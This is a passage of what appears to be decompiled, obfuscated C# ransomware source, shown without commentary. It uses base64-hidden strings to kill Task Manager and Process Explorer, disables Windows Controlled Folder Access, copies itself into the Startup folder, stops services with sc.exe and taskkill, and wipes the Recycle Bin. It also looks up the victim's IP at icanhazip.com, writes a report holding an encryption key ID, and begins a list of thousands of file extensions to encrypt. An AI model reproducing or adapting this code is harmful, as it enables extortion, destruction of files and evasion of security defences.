						jLGThbkXlozfB("dGFza21ncg=="),
						jLGThbkXlozfB("UHJvY2Vzc0hhY2tlcg=="),
						jLGThbkXlozfB("cHJvY2V4cA==")
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						xkRzQgTOxjz.ZiKybVjpMkSxOel(wYdUGPCdlHxOyfY);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				NYowkpFpzDSwsqo.neqBcLhKvTzoL(jLGThbkXlozfB("dGFza21ncg=="));
			}
			catch
			{
			}
			try
			{
				NYowkpFpzDSwsqo.neqBcLhKvTzoL(jLGThbkXlozfB("cHJvY2V4cA=="));
			}
			catch
			{
			}
			try
			{
				NYowkpFpzDSwsqo.neqBcLhKvTzoL(jLGThbkXlozfB("cHJvY2V4cDY0"));
			}
			catch
			{
			}
			try
			{
				NYowkpFpzDSwsqo.neqBcLhKvTzoL(jLGThbkXlozfB("UHJvY2Vzc0hhY2tlcg=="));
			}
			catch
			{
			}
			Thread thread3 = new Thread(xkRzQgTOxjz.CJdnHcrOWe);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && bTKcrEXcTJyWfaHr == "YES")
		{
			try
			{
				nctwavPJYoXoE(jLGThbkXlozfB("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		try
		{
			if (giEoGQYoWa == "YES" && cJheUZOIFJoYsp.FPDHkrXiHuBo())
			{
				new XmlqONJtKCTDAA().aPESQrjdcFWWRjJ(MZJVxsRnSpmpW: false);
				cJheUZOIFJoYsp.foWoyaICHaij();
			}
		}
		catch (Exception)
		{
		}
		if (hVteTYaqLq == "YES" && cJheUZOIFJoYsp.FPDHkrXiHuBo())
		{
			new XmlqONJtKCTDAA().aPESQrjdcFWWRjJ(MZJVxsRnSpmpW: false);
			new XmlqONJtKCTDAA().rpzUMUQZvyHL();
		}
		if (ThSfnIdCvNY == "YES")
		{
			mTMYlpwpXyVKHH.YxnIIclznZPZ();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (HTnfErSawbWHbHzse == "YES" && fileName != text2)
			{
				Thread thread4 = new Thread(tdqoLlZAUS);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (lMeUFQvXnYqbYME == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					cWilMsxtbhpPMPPp = BcGKKoCAFaSC(0, VPldzavOggk.Count);
					File.Copy(fileName, text + VPldzavOggk[cWilMsxtbhpPMPPp], overwrite: true);
					Process.Start(text + VPldzavOggk[cWilMsxtbhpPMPPp]);
					jwTBUSCtlPIOvVR();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (amFRGHgQcJN == "YES" && DateTime.Now < NhSwGbCoZjK)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (mWPqddGpHqa == "YES" && DateTime.Now > SdwNhoBgGmWy)
			{
				jwTBUSCtlPIOvVR();
			}
		}
		catch
		{
		}
		RXVsGvXUCNvyC();
		Thread thread5 = new Thread((ThreadStart)delegate
		{
			Parallel.ForEach(dUjxItPnQNdt, delegate(string uIMWiIxWjRY)
			{
				UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("c2MuZXhl"), uIMWiIxWjRY);
			});
			Parallel.ForEach(iREfJhsvOQZG, delegate(string QvYYyelVyeURajIr)
			{
				UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("dGFza2tpbGwuZXhl"), QvYYyelVyeURajIr);
			});
			if (oLbPEODNywhpzfGE == "YES")
			{
				Parallel.ForEach(xIJoCgpUCtQ, delegate(string LzvAHWLmjbo)
				{
					UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("dGFza2tpbGwuZXhl"), "/IM " + LzvAHWLmjbo + " /f");
				});
			}
			if (!woXXmqCRhpoJW().Contains("XP"))
			{
				taIBdDARBKkh(uNzPBpjIavDZ);
			}
			else
			{
				Parallel.ForEach(JYQmAzdqcxULKnC, delegate(string sCtMqeJvRvo)
				{
					UkvSKngWEJZsJKEGJr(jLGThbkXlozfB(izdftkkvVp("lhXZu4WatRWYzNnd")), sCtMqeJvRvo);
				});
			}
			Parallel.ForEach(RVqWYkzoWxGm, delegate(string lKkYKkMNvdDOHHsk)
			{
				UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("ZGVsLmV4ZQ=="), lKkYKkMNvdDOHHsk);
			});
		});
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains("PriorityPath="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !lZNmNTLNdP.Contains(text6) && text6 != "X:\\CustomPath1" && text6 != "Z:\\CustomPath2" && text6 != "\\\\Domain\\Path\\Folder")
								{
									lZNmNTLNdP.Add(text6);
								}
							}
						}
					}
					if (text3.Contains("Network="))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == "true")
						{
							WiaPiYoSCi = "YES";
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == "false")
						{
							WiaPiYoSCi = "NO";
						}
					}
					if (text3.Contains("ConsoleMode="))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == "true")
						{
							MFBaFacYIYTeS = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == "false")
						{
							MFBaFacYIYTeS = false;
						}
					}
					if (text3.Contains("DebugLog="))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == "true")
						{
							dwCcrxocWgDvY = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == "false")
						{
							dwCcrxocWgDvY = false;
						}
					}
					if (text3.Contains("ImpersonateExplorer="))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == "true")
						{
							OpScyAmeLLoG = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == "false")
						{
							OpScyAmeLLoG = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(HXSuIBiFjcFlYv, "Configuration text file error: " + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (WiaPiYoSCi == "NO")
		{
			ruqPoKjquJOvb();
		}
		if (WiaPiYoSCi == "YES")
		{
			try
			{
				RKhzhpGZREiyW();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && vzPdfnHBMtjz)
			{
				try
				{
					Thread thread6 = new Thread(QldSeOytJazJGxdo.rrOEpRMjgPqZ);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			UkvSKngWEJZsJKEGJr("cmd.exe", jLGThbkXlozfB("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
		}
		if (kmIhcYcmYJ == "YES" && CVygjsJiqVXAn() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread7 = new Thread(bOiDbXVJjvh.IaouUGmGhVa);
			thread7.IsBackground = false;
			thread7.Priority = ThreadPriority.Normal;
			thread7.Start();
		}
		_ = HYjxnmyoAE == "YES";
		SecureString secureString = new SecureString();
		if (bWUhszpWYNSz == "NO")
		{
			eddVxanYaxlAWs = utDHmaEnPafSsZ.zXqCMkpXvvDkS(32);
			xcViaPUwRrRv = utDHmaEnPafSsZ.GdIXFYPygrqzMs();
		}
		else
		{
			eddVxanYaxlAWs = "0HVF9NON5OFSWQNC13ZA2QTEXIJV9PHZ";
		}
		WepagbesBWfUGP = JXLBTRDtuzyaHWFE.hHOovCgFovscyM(eddVxanYaxlAWs + xcViaPUwRrRv);
		if (NEFPxtrjgZ == "YES")
		{
			ckUJBDBugoMNSTT();
		}
		if (ilGORNmyHnqImSU)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), QHZTFDubwp)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), QHZTFDubwp), string.Concat(jLGThbkXlozfB("Q2xpZW50IElQOiA="), new WebClient().DownloadString(jLGThbkXlozfB("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", jLGThbkXlozfB("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", jLGThbkXlozfB("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), WepagbesBWfUGP));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), QHZTFDubwp), "\r\nAdditional KeyID: " + WepagbesBWfUGP);
				}
			}
			catch (Exception ex9)
			{
				if (dwCcrxocWgDvY)
				{
					try
					{
						File.AppendAllText(HXSuIBiFjcFlYv, "Error while creating Local Report: " + ex9.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		HTiWbNmTwEvSjpT.kkVOVbJGih(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), jMMJJGmjJwKTlH), qbAytolpffIQZh(WepagbesBWfUGP), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			pJkCjbTuLamHj();
		}
		try
		{
			try
			{
				if (MFBaFacYIYTeS)
				{
					Console.WriteLine("Files securing is about to start...");
				}
			}
			catch
			{
			}
			sDJGhnendTnZQp(new string[1] { "[auto]" }, new string[4822]
			{
				"$$$", "$db", "$efs", "$er", "^^^", "__a", "__b", "{pb", "~cw", "~hm",
				"0", "000", "001", "1", "101", "103", "108", "110", "113", "123",
				"128", "17t", "1CD", "1pe", "1ph", "1sp", "1st", "2", "2mg", "2Q0",
				"2QM", "3", "3d", "3d4", "3dd", "3df", "3df8", "3dm", "3dmdef", "3dp",
				"3dr", "3ds", "3dt", "3dw", "3dxml", "3fr", "3g2", "3ga", "3gp", "3gp2",
				"3me", "3MF", "3mm", "3pe", "3pr", "3w", "4dd", "4dl", "4dv", "4fs",
				"4w7", "5vw", "602", "73b", "73c", "73l", "7z", "7z001", "7z002", "7zip",
				"8", "86f", "89t", "89y", "8ba", "8bc", "8be", "8bf", "8bi8", "8bl",
				"8bs", "8bx", "8by", "8li", "8svx", "8xg", "8xk", "8xs", "8xt", "8xv",
				"9xt", "9xy", "a$v", "a00", "a01", "a02", "a2c", "a5l", "a5w", "a65",
				"aa", "aa3", "aac", "aaf", "aah", "aam", "aao", "aaui", "ab", "ab1",
				"ab3", "ab4", "ab65", "aba", "abbu", "abc", "abcd", "abf", "abi", "abk",
				"abkprj", "abp", "abt", "abw", "aby", "ac2", "ac3", "ac5", "aca", "acc",
				"accdb", "accdc", "accde", "accdr", "accdt", "accft", "ACCTB", "ace", "acf", "acg",
				"ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings", "acrodata", "acroplugin", "acrypt", "act",
				"acz", "ad", "ada", "adb", "adc", "adcp", "add", "addism", "ade", "adf",
				"adi", "adif", "adoc", "ados", "adox", "adp", "adpb", "adr", "ads", "adt",
				"adu", "adv", "advs", "adx", "adz", "aea", "aec", "aep", "aepx", "aes",
				"aet", "afd", "afdesign", "afe", "aff", "afi", "afm", "afp", "aft", "agd",
				"agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec", "age3xsav", "age3xscn", "age3yrec", "age3ysav",
				"age3yscn", "aggr", "ahf", "ai", "aif", "aifb", "aiff", "aim", "ain", "AIO",
				"aip", "ais", "ait", "ak", "al", "al8", "ala", "alb3", "alb4", "alb5",
				"alb6", "alc", "ald", "aldf", "alf", "ali", "allet", "alt3", "alt5", "alz",
				"AM", "amb", "amc", "amf", "aml", "amm", "amr", "amsorm", "amt", "amu",
				"amx", "amxx", "an1", "an8", "anime", "anl", "anme", "ann", "ans", "ansr",
				"ansym", "anx", "aoi", "ap", "apa", "apalbum", "apd", "ape", "apf", "aph",
				"api", "apj", "apk", "aplibrary", "apnx", "apo", "app", "APPCACHE", "approj", "APPX",
				"apr", "apt", "apw", "apxl", "apz", "ar", "arc", "arch00", "archiver", "arduboy",
				"arff", "ari", "arj", "arn", "aro", "arr", "ars", "art", "arw", "as",
				"as$", "as3", "asa", "asc", "ascm", "ascx", "asd", "ase", "asf", "ashbak",
				"ashdisc", "ashprj", "ashx", "ask", "asl", "asm", "asmx", "asn", "asnd", "asp",
				"aspx", "asr", "asset", "ast", "asv", "asvx", "asx", "atf", "ath", "atl",
				"atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux", "av", "avc", "avhd", "avhdx",
				"avj", "avl", "avn", "avp", "avs", "AW", "awb", "awbr", "awd", "awdb",
				"awe", "awg", "awp", "aws", "awt", "aww", "awwp", "ax", "azf", "azs",
				"azw", "azw1", "azw3", "azw4", "azz", "azzx", "b", "b1", "b27", "b2a",
				"b5i", "b5t", "b64", "b6i", "b6t", "b6z", "ba", "ba6", "ba7", "ba8",
				"ba9", "bac", "back", "backup", "backupdb", "bad", "bafl", "bak", "bak~", "bak2",
				"bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj", "bau", "bax", "bay", "bbb",
				"bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz", "bc", "bc5", "bc6", "bc7",
				"bcc", "bcd", "bci", "bck", "bckp", "bcl", "bcm", "bcp", "bct", "bdb",
				"bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp", "bdr", "bdt2", "bdt3", "bean",
				"bed", "bfa", "bff", "bfx", "bgl", "bgt", "bgv", "bh", "bho", "bi8",
				"bib", "bibtex", "bic", "bif", "bifx", "big", "bik", "bil", "bim", "bin",
				"bina", "binary", "bionix", "BIT", "bizdocument", "bjl", "bjo", "bk", "bk!", "bk1",
				"bk2", "bk3", "bk4", "bk5", "bk6", "bk7", "bk8", "bk9", "bkc", "bkf",
				"bkg", "bkp", "bks", "bkup", "bkz", "blb", "bld", "blend", "blend1", "blend2",
				"blg", "blk", "blm", "bln", "blob", "blockplt", "blogthis", "blp", "bluebutton", "bm2",
				"bm3", "bmc", "bmf", "bmk", "bml", "bmm", "bmml", "bmpr", "bms", "bna",
				"bndl", "bnk", "boc", "bok", "boo", "book", "bookexport", "bop", "box", "bp1",
				"bp2", "bp3", "bpa", "bpb", "bpd", "bpdx", "bpf", "bphys", "bpj", "bpk",
				"bpl", "bplx", "bpm", "bpmc", "bpn", "bps", "bpw", "brain", "brd", "breaking_bad",
				"brf", "brh", "brl", "brn", "BROWSER", "brs", "brw", "brx", "bsa", "bsd",
				"bsdl", "bsk", "bso", "bsp", "bst", "btd", "btf", "btif", "btinstall", "BTL",
				"btm", "btoa", "btr", "btx", "BUD", "bul", "bundle", "bup", "burn", "burntheme",
				"bvd", "bvp", "bwa", "bwd", "bwf", "bwi", "bwp", "bws", "bwt", "bwz",
				"BXF", "bxx", "bz", "bz2", "bza", "bzabw", "bzip", "bzip2", "c", "c00",
				"c01", "c02", "c10", "c2e", "c3d", "c4p", "c6", "cadoc", "cae", "caf",
				"cag", "calca", "cam", "camm", "camproj", "cap", "capt", "capx", "car", "caro",
				"cas", "cat", "catproduct", "cav", "cawr", "cb7", "cba", "cbf", "cbg", "cbmap",
				"cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc", "cca", "ccc", "ccd",
				"ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd", "cd1", "cd2", "cdb",
				"cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl", "cdm", "cdml", "cdmm",
				"cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5", "cdr6", "cdrw", "cds",
				"cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef", "cel", "celtx", "cenon~",
				"cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd", "cfg", "cfp", "cfr",
				"cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp", "chg", "chi", "chk",
				"chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht", "chtml", "cib", "cida",
				"cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9", "ckp", "ckt", "cl2",
				"cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist", "clb", "cld", "clg",
				"clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk", "clkv", "clm", "clp",
				"clr", "cls", "clx", "cm10", "cm5", "cma", "cmap", "CMB", "cmbl", "cmf",
				"cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna", "cnf", "cng", "cnt",
				"cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS", "compositionmodel", "compositiontemplate", "con",
				"conf", "config", "contact", "converterx", "cp", "cp9", "CPA", "cpaa", "cpc", "cpd",
				"cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk", "cpmz", "cpp", "cpt",
				"cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb", "crd", "crds", "creole",
				"crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr", "crtx", "crw", "crwl",
				"cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall", "cryptra", "cs", "cs8",
				"csa", "csd", "cse", "CSG", "csh", "csi", "csl", "csm", "cso", "csp",
				"csr", "css", "cst", "csv", "ctb", "ctbl", "ctd", "cte", "ctf", "CTG",
				"ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3", "ctx", "ctxt", "cty",
				"cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva", "cvd", "cvj", "cvl",
				"cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr", "cws", "cww", "cwwp",
				"cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi", "cyo", "cys", "czi",
				"czip", "czp", "d", "d00", "d01", "d3dbsp", "d64", "d88", "da0", "da2",
				"daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf", "dag", "dal", "dam",
				"dao", "dap", "dar", "das", "daschema", "dash", "dat", "DATA", "database", "datx",
				"dax", "dayzprofile", "dazip", "db", "db_journal", "db0", "db3", "dba", "dbb", "dbc",
				"dbcrypt12", "dbcrypt8", "dbd", "dbf", "DBF", "dbfv", "dbgsym", "db-journal", "dbk", "dbr",
				"dbs", "db-shm", "dbt", "dbv", "db-wal", "dbx", "dc2", "dc4", "dca", "dcb",
				"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
				"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
				"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
				"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
				"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
				"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
				"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
				"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
				"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
				"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
				"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
				"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
				"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
				"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
				"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
				"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
				"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
				"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
				"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
				"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
				"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
				"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
				"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
				"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
				"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
				"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
				"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
				"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
				"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
				"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
				"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
				"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
				"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "epf",
				"EPF", "epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub",
				"epw", "eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err",
				"ersx", "es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm",
				"esp", "esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt",
				"ets", "ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p",
				"ev3s", "evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc",
				"exd", "exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez",
				"ezc", "ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90",
				"f96", "fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta",
				"fax", "fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw",
				"fcd", "fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct",
				"fd", "fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds",
				"fdseq", "fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff",
				"ffa", "ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx",
				"fg3", "fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin",
				"fingnet", "fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg",
				"flib", "flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp",
				"fls", "flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat",
				"fmc", "fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk",
				"fnf", "fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol",
				"folio", "folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3",
				"fp4", "fp5", "fp7", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk",
				"fplinkbar", "fpp", "fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag",
				"frameset", "frd", "frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs",
				"fsa", "fsc", "fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10",
				"ft11", "ft7", "ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw",
				"ful", "fwbackup", "fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo",
				"fxp", "fxr", "fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m",
				"g41", "ga3", "gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1",
				"gb2", "gbi", "gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca",
				"gcd", "gcg", "gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable",
				"gdc", "gdf", "GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom",
				"gen", "genbank", "geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs",
				"gfx", "ggb", "ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh",
				"gla", "gld", "glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl",
				"gml", "gmp", "gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3",
				"gp4", "gpd", "gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan",
				"gpx", "gpz", "gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey",
				"grf", "grib", "grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr",
				"grs", "grt", "grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet",
				"gslides", "gsm", "GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp",
				"gts", "gui", "guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl",
				"gxt", "gz", "gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11",
				"h12", "h13", "h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o",
				"h2w", "h3m", "h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml",
				"hbk", "hbl", "hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr",
				"hcu", "hcw", "hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl",
				"hdpmx", "hds", "hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex",
				"hfd", "hfs", "hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb",
				"HKF", "hkx", "hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3",
				"hml", "hmskin", "hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2",
				"hpd", "hpj", "hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx",
				"hs", "hs2", "hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg",
				"htm", "htm~", "html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc",
				"HVE", "hvpl", "hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN",
				"hxq", "hxr", "hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02",
				"i5z", "iab", "iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb",
				"ibcd", "ibd", "ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo",
				"icbu", "icc", "icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics",
				"icst", "icxs", "id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml",
				"idp", "idx", "ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff",
				"ifiction", "ifm", "ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr",
				"ihf", "ihp", "ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg",
				"ilogicvb", "ima", "image", "imd", "img", "imp", "imr", "imt", "imz", "in",
				"INBOX", "INC", "incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp",
				"indt", "inf", "info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins",
				"inss", "installhelper", "insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias",
				"ipd", "ipf", "iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock",
				"irp", "irr", "irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso",
				"ispc", "ispx", "ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm",
